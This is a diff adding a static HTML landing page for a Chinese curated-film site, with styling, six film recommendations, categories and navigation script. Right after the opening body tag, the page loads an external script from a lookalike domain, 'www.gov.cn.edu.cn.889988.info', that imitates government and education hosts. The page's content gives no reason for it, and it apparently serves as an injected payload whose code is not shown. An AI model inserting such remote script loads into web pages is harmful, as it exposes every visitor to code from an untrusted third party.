@@ -1,0 +1,432 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>私人电影网 - 私人影单 · 精选好片 · 专属观影空间</title>
+<meta name="description" content="私人电影网（sirendianyingwang-h5）为你打造专属观影空间，精选高分电影、冷门佳作、私人影单推荐，告别算法推荐，回归纯粹观影体验。">
+<meta name="keywords" content="私人电影网, 私人影单, 精选电影, 专属观影, 高分好片, 冷门佳作, sirendianyingwang-h5">
+<style>
+:root{
+  --brown:#2d1b0e;
+  --brown-light:#4a2f1a;
+  --brown-dark:#1a0f08;
+  --gold:#c9a84c;
+  --gold-light:#e8d48b;
+  --cream:#faf6ef;
+  --line:rgba(201,168,76,.25);
+  --text:#3d2b1a;
+  --muted:#8a7a6a;
+  --shadow:0 8px 32px rgba(45,27,14,.15);
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  font-family:"Cormorant Garamond","Songti SC","STSong","Noto Serif SC",serif;
+  background:var(--cream);
+  color:var(--text);
+  line-height:1.8;
+}
+
+a{color:var(--gold);text-decoration:none;transition:.3s}
+a:hover{color:var(--brown)}
+
+/* 顶部丝带 */
+.ribbon{
+  background:var(--brown-dark);
+  color:var(--gold-light);
+  text-align:center;
+  padding:.4rem;
+  font-size:.75rem;
+  letter-spacing:3px;
+  border-bottom:1px solid var(--line);
+}
+
+/* 头部 */
+.header{
+  background:var(--cream);
+  border-bottom:1px solid var(--line);
+  position:sticky;top:0;z-index:999;
+}
+.header-in{
+  max-width:1100px;margin:0 auto;padding:1.2rem 1rem;
+  display:flex;justify-content:space-between;align-items:center;gap:1rem;flex-wrap:wrap;
+}
+.brand{display:flex;align-items:center;gap:.8rem}
+.brand-mark{
+  width:48px;height:48px;
+  background:var(--brown);
+  border:2px solid var(--gold);
+  border-radius:50%;
+  display:flex;align-items:center;justify-content:center;
+  font-size:1.3rem;color:var(--gold);
+}
+.brand-text h1{
+  font-size:1.5rem;font-weight:700;letter-spacing:2px;color:var(--brown-dark);
+}
+.brand-text h1 span{color:var(--gold)}
+.brand-text p{font-size:.7rem;color:var(--muted);letter-spacing:1px}
+.nav{display:flex;gap:.2rem;flex-wrap:wrap}
+.nav a{
+  padding:.5rem 1.1rem;border-radius:4px;font-size:.9rem;font-weight:600;
+  color:var(--text);letter-spacing:.5px;
+}
+.nav a:hover,.nav a.active{
+  background:var(--brown);color:var(--gold-light);
+}
+
+.wrap{max-width:1100px;margin:0 auto;padding:0 1rem}
+
+/* Hero */
+.hero{
+  padding:4rem 0 3rem;text-align:center;position:relative;
+  background:
+    radial-gradient(ellipse at 50% 0%, rgba(201,168,76,.08), transparent 70%),
+    var(--cream);
+}
+.hero::before,.hero::after{
+  content:'❦';position:absolute;top:2rem;font-size:2rem;color:var(--line);
+}
+.hero::before{left:2rem}
+.hero::after{right:2rem}
+.hero h2{
+  font-size:clamp(2rem,6vw,3.2rem);font-weight:700;
+  color:var(--brown-dark);margin-bottom:1rem;letter-spacing:1px;
+}
+.hero h2 em{
+  font-style:normal;color:var(--gold);
+}
+.hero p{
+  font-size:1.05rem;color:var(--muted);max-width:540px;
+  margin:0 auto 2rem;font-style:italic;
+}
+.invite-box{
+  max-width:480px;margin:0 auto;
+  background:#fff;border:1px solid var(--line);border-radius:8px;
+  padding:1rem;display:flex;box-shadow:var(--shadow);
+}
+.invite-box input{
+  flex:1;border:0;outline:0;background:transparent;
+  padding:.6rem 1rem;font-size:1rem;color:var(--text);
+}
+.invite-box button{
+  background:var(--brown);color:var(--gold-light);
+  border:0;padding:0 1.5rem;border-radius:4px;font-weight:600;
+  cursor:pointer;transition:.2s;
+}
+.invite-box button:hover{background:var(--gold);color:var(--brown-dark)}
+
+/* 分隔 */
+.divider{
+  text-align:center;padding:2rem 0;color:var(--gold);font-size:1.2rem;letter-spacing:8px;
+}
+
+/* 区块 */
+.section{padding:3rem 0}
+.head{
+  text-align:center;margin-bottom:2rem;
+}
+.head .num{
+  display:inline-block;width:32px;height:32px;
+  background:var(--gold);color:var(--brown-dark);
+  border-radius:50%;font-weight:700;font-size:.9rem;
+  line-height:32px;margin-bottom:.8rem;
+}
+.head h2{
+  font-size:1.6rem;font-weight:700;color:var(--brown-dark);letter-spacing:1px;
+}
+.head p{color:var(--muted);font-size:.9rem;margin-top:.3rem;font-style:italic}
+
+/* 私人影单 */
+.list{
+  display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:1.5rem;
+}
+.film{
+  background:#fff;border:1px solid var(--line);border-radius:10px;
+  overflow:hidden;transition:.3s;cursor:pointer;
+}
+.film:hover{
+  transform:translateY(-4px);box-shadow:0 16px 40px rgba(201,168,76,.2);
+  border-color:var(--gold);
+}
+.film-cover{
+  height:140px;display:flex;align-items:center;justify-content:center;
+  font-size:2.5rem;
+}
+.film:nth-child(1) .film-cover{background:linear-gradient(135deg,#2d1b0e,#4a2f1a)}
+.film:nth-child(2) .film-cover{background:linear-gradient(135deg,#1a2d1e,#2f4a35)}
+.film:nth-child(3) .film-cover{background:linear-gradient(135deg,#1a1e2d,#2f354a)}
+.film:nth-child(4) .film-cover{background:linear-gradient(135deg,#2d1a2d,#4a2f4a)}
+.film:nth-child(5) .film-cover{background:linear-gradient(135deg,#2d2a1a,#4a452f)}
+.film:nth-child(6) .film-cover{background:linear-gradient(135deg,#1e2d2d,#354a4a)}
+.film-body{padding:1.2rem}
+.film-body h3{font-size:1.05rem;margin-bottom:.3rem;color:var(--brown-dark)}
+.film-body .meta{font-size:.78rem;color:var(--muted);margin-bottom:.5rem}
+.film-body .note{
+  font-size:.82rem;color:var(--text);line-height:1.6;
+  border-left:2px solid var(--gold);padding-left:.8rem;font-style:italic;
+}
+
+/* 分类 */
+.cats{
+  display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:1.2rem;
+}
+.cat{
+  background:#fff;border:1px solid var(--line);border-radius:10px;padding:1.5rem;
+  text-align:center;transition:.3s;
+}
+.cat:hover{
+  background:var(--brown);border-color:var(--gold);
+}
+.cat:hover h3,.cat:hover p{color:var(--gold-light)}
+.cat .icon{font-size:2rem;margin-bottom:.8rem}
+.cat h3{font-size:1rem;margin-bottom:.3rem;color:var(--brown-dark);transition:.3s}
+.cat p{font-size:.78rem;color:var(--muted);transition:.3s}
+
+/* 关于 */
+.about{
+  background:#fff;border:1px solid var(--line);border-radius:14px;
+  padding:2.5rem;display:grid;grid-template-columns:1fr 1fr;gap:2.5rem;align-items:center;
+  box-shadow:var(--shadow);
+}
+.about-left h3{font-size:1.5rem;margin-bottom:1rem;color:var(--brown-dark)}
+.about-left p{color:var(--muted);margin-bottom:1rem;font-size:.95rem}
+.about-left ul{list-style:none;padding:0}
+.about-left li{
+  padding:.5rem 0;border-bottom:1px dashed var(--line);
+  color:var(--text);font-size:.9rem;
+}
+.about-left li::before{content:'✦ ';color:var(--gold)}
+.about-right{
+  text-align:center;padding:2rem;
+  background:linear-gradient(135deg,var(--brown),var(--brown-light));
+  border-radius:12px;color:var(--gold-light);
+}
+.about-right .seal{
+  width:80px;height:80px;margin:0 auto 1rem;
+  border:3px solid var(--gold);border-radius:50%;
+  display:flex;align-items:center;justify-content:center;
+  font-size:2rem;color:var(--gold);
+}
+.about-right h4{font-size:1.2rem;margin-bottom:.5rem}
+.about-right p{font-size:.85rem;opacity:.8}
+
+/* 页脚 */
+.footer{
+  background:var(--brown-dark);color:var(--muted);
+  padding:2.5rem 1rem;text-align:center;margin-top:3rem;
+}
+.footer h3{color:var(--gold-light);font-size:1.3rem;margin-bottom:.5rem;letter-spacing:2px}
+.footer h3 span{color:var(--gold)}
+.footer p{font-size:.78rem;margin-top:.4rem}
+.footer a{color:var(--gold)}
+
+/* 响应式 */
+@media(max-width:768px){
+  .hero h2{font-size:1.8rem}
+  .invite-box{flex-direction:column;border-radius:8px}
+  .invite-box input{border-bottom:1px solid var(--line)}
+  .invite-box button{padding:1rem}
+  .about{grid-template-columns:1fr;padding:1.5rem}
+  .list{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="ribbon">
+  ❦ 私人放映 · 专属影单 · 拒绝算法 ❦
+</div>
+
+<header class="header">
+  <div class="header-in">
+    <div class="brand">
+      <div class="brand-mark">私</div>
+      <div class="brand-text">
+        <h1>私人<em>电影网</em></h1>
+        <p>sirendianyingwang-h5.github.io</p>
+      </div>
+    </div>
+    <nav class="nav">
+      <a href="#home" class="active">首页</a>
+      <a href="#list">私人影单</a>
+      <a href="#cats">分类收藏</a>
+      <a href="#about">关于本站</a>
+    </nav>
+  </div>
+</header>
+
+<div class="wrap">
+
+  <!-- 首页 -->
+  <section id="home" class="hero">
+    <h2>你的<em>私人</em>放映室</h2>
+    <p>拒绝算法推荐，拒绝千篇一律。私人电影网（sirendianyingwang-h5）为你甄选每一部值得花时间看完的片子。</p>
+    <div class="invite-box">
+      <input type="text" placeholder="输入片名，搜索你的私人影单...">
+      <button>搜索</button>
+    </div>
+  </section>
+
+  <div class="divider">❦ ❦ ❦</div>
+
+  <!-- 私人影单 -->
+  <section id="list" class="section">
+    <div class="head">
+      <span class="num">1</span>
+      <h2>私人影单</h2>
+      <p>Curated by real humans, not algorithms</p>
+    </div>
+    <div class="list">
+      <div class="film">
+        <div class="film-cover">🎬</div>
+        <div class="film-body">
+          <h3>天堂电影院</h3>
+          <div class="meta">剧情 / 1988 / 意大利</div>
+          <div class="note">"如果你不出去走走，你就会以为这就是全世界。" —— 每个爱电影的人都该看一遍。</div>
+        </div>
+      </div>
+      <div class="film">
+        <div class="film-cover">🎞</div>
+        <div class="film-body">
+          <h3>布达佩斯大饭店</h3>
+          <div class="meta">喜剧 / 2014 / 美国</div>
+          <div class="note">韦斯·安德森的对称美学巅峰，每一帧都是明信片。</div>
+        </div>
+      </div>
+      <div class="film">
+        <div class="film-cover">📽</div>
+        <div class="film-body">
+          <h3>降临</h3>
+          <div class="meta">科幻 / 2016 / 美国</div>
+          <div class="note">语言即思维。一部关于时间与爱的科幻诗。</div>
+        </div>
+      </div>
+      <div class="film">
+        <div class="film-cover">🎭</div>
+        <div class="film-body">
+          <h3>海上钢琴师</h3>
+          <div class="meta">音乐 / 1998 / 意大利</div>
+          <div class="note">"城市那么大，看不到尽头。" 1900 的选择，是浪漫也是勇气。</div>
+        </div>
+      </div>
+      <div class="film">
+        <div class="film-cover">🌙</div>
+        <div class="film-body">
+          <h3>路边野餐</h3>
+          <div class="meta">文艺 / 2015 / 中国</div>
+          <div class="note">毕赣的长镜头像一首潮湿的诗，贵州凯里的雾气里藏着时间。</div>
+        </div>
+      </div>
+      <div class="film">
+        <div class="film-cover">🔭</div>
+        <div class="film-body">
+          <h3>星际穿越</h3>
+          <div class="meta">科幻 / 2014 / 美国</div>
+          <div class="note">爱是唯一可以超越时间和空间的东西。诺兰写给宇宙的情书。</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <div class="divider">❦ ❦ ❦</div>
+
+  <!-- 分类收藏 -->
+  <section id="cats" class="section">
+    <div class="head">
+      <span class="num">2</span>
+      <h2>分类收藏</h2>
+      <p>Your Personal Collection</p>
+    </div>
+    <div class="cats">
+      <div class="cat">
+        <div class="icon">🕰</div>
+        <h3>经典重映</h3>
+        <p>影史百佳 · 4K修复 · 永恒之作</p>
+      </div>
+      <div class="cat">
+        <div class="icon">🎨</div>
+        <h3>视觉美学</h3>
+        <p>构图 / 色彩 / 光影 / 每一帧都是画</p>
+      </div>
+      <div class="cat">
+        <div class="icon">📖</div>
+        <h3>文学改编</h3>
+        <p>小说到银幕 · 文字与影像的对话</p>
+      </div>
+      <div class="cat">
+        <div class="icon">🎵</div>
+        <h3>音乐电影</h3>
+        <p>配乐神作 · 歌舞片 · 声音设计</p>
+      </div>
+      <div class="cat">
+        <div class="icon">🌏</div>
+        <h3>世界之窗</h3>
+        <p>非英语佳作 · 多元文化 · 全球视野</p>
+      </div>
+      <div class="cat">
+        <div class="icon">🔍</div>
+        <h3>深度解析</h3>
+        <p>影评 · 拉片 · 导演访谈 · 幕后故事</p>
+      </div>
+    </div>
+  </section>
+
+  <div class="divider">❦ ❦ ❦</div>
+
+  <!-- 关于 -->
+  <section id="about" class="section">
+    <div class="head">
+      <span class="num">3</span>
+      <h2>关于本站</h2>
+      <p>Behind the Screen</p>
+    </div>
+    <div class="about">
+      <div class="about-left">
+        <h3>为什么叫「私人电影网」？</h3>
+        <p><strong>私人电影网</strong>（https://sirendianyingwang-h5.github.io）不是一个资源站，而是一个<strong>选片空间</strong>。我们相信：</p>
+        <ul>
+          <li>好电影值得被认真推荐，而不是被算法淹没</li>
+          <li>每个人的观影口味都是私人的、独特的</li>
+          <li>一部好片 + 一杯好酒 + 一个安静的夜晚 = 最好的时光</li>
+          <li>我们不做大而全，只做精而美</li>
+        </ul>
+        <p style="margin-top:1rem"><a href="https://sirendianyingwang-h5.github.io">🌐 sirendianyingwang-h5.github.io</a></p>
+      </div>
+      <div class="about-right">
+        <div class="seal">私</div>
+        <h4>私人放映室</h4>
+        <p>Curated with care<br>since 2026</p>
+      </div>
+    </div>
+  </section>
+
+</div>
+
+<footer class="footer">
+  <h3>私人<span>电影网</span></h3>
+  <p>你的专属观影空间 · 精选好片 · 拒绝算法</p>
+  <p>© 2026 私人电影网 | <a href="https://sirendianyingwang-h5.github.io">sirendianyingwang-h5.github.io</a></p>
+  <p>本站为静态演示页面，所有链接均为 # 占位，不生成 robots.txt / sitemap.xml。</p>
+</footer>
+
+<script>
+const links=[...document.querySelectorAll('.nav a')];
+const secs=[...document.querySelectorAll('section[id]')];
+links.forEach(a=>a.addEventListener('click',e=>{
+  const id=a.getAttribute('href');
+  if(id&&id.startsWith('#')&&document.querySelector(id)){
+    e.preventDefault();
+    document.querySelector(id).scrollIntoView({behavior:'smooth',block:'start'});
+  }
+}));
+addEventListener('scroll',()=>{
+  let cur='home';
+  secs.forEach(s=>{if(scrollY>=s.offsetTop-120)cur=s.id;});
+  links.forEach(l=>l.classList.toggle('active',l.getAttribute('href')==='#'+cur));
+});
+</script>
+</body>
+</html>
